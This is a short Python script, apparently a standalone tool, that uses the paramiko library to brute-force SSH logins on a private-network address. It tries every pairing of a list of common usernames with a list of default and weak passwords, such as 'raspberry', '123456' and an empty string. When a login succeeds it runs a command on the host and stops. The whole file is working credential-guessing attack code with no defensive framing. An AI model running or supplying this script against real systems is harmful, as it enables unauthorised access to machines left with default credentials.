import paramiko
import sys

ip = "192.168.3.132"
users = ["root", "pi", "ubuntu", "debian", "user", "admin", "gallium", "berna"]
passwords = ["root", "raspberry", "ubuntu", "password", "admin", "gallium", "123456", "1234", "", "notebook", "wayland", "linux", "debian", "pass"]

for user in users:
    for pwd in passwords:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            print(f"Trying {user}:{pwd}...", end="", flush=True)
            client.connect(ip, username=user, password=pwd, timeout=3)
            print(" SUCCESS!")
            stdin, stdout, stderr = client.exec_command("uname -a")
            print(stdout.read().decode())
            client.close()
            sys.exit(0)
        except Exception as e:
            print(f" failed ({e})")
